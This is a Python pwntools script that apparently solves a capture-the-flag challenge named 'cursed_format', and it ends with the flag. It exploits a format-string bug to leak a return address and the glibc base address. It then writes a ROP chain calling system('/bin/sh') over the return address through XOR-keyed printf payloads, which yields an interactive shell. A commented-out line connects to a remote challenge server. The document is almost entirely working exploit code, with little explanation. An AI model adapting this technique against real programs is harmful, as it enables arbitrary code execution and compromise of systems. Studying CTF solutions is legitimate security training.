from pwn import *

context.arch = 'amd64'
context.bits = 64
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./cursed_format_patched', '''
    brva 0x137a
    continue
''')

# p = remote('18.212.136.134', 8887)

# key is 0x20 bytes of 0xff initially
key = b'\xff'*0x20

# each payload undergoes: payload = payload ^ key, key = payload, and printf(payload)
def keep_formatting(payload, key):
    p.sendlineafter(b">> ", b'1')
    p.send(xor(payload, key))
    return payload

# return from main
def just_leave():
    p.sendlineafter(b">> ", b'2')

# 1. leak current return address and glibc base address through fmtstr
key = keep_formatting(b'%14$p%17$p'.ljust(0x20, b'\x00'), key)
leaks = p.recvuntil(b"1. Keep formatting", drop=True)
current_return_addr = int(leaks[0:14], 16)-0xe8
log.info(f"current return address: {hex(current_return_addr)}")
glibc_base_addr = int(leaks[14:28], 16)-0x23d7a
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. ROP through fmtstr to trigger system("/bin/sh\x00")
e = ELF('./cursed_format')
glibc_e = ELF('./libc-2.31.so')
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
payload = b''.join(p64(c) for c in chain)
for i in range(0, len(payload), 2):
    key = keep_formatting(fmtstr_payload(10, {current_return_addr+i: payload[i:i+2]}, write_size='short').ljust(0x20, b'\x00'), key)
just_leave()

p.interactive()

# pctf{im_sorry_i_made_you_do_that_lol}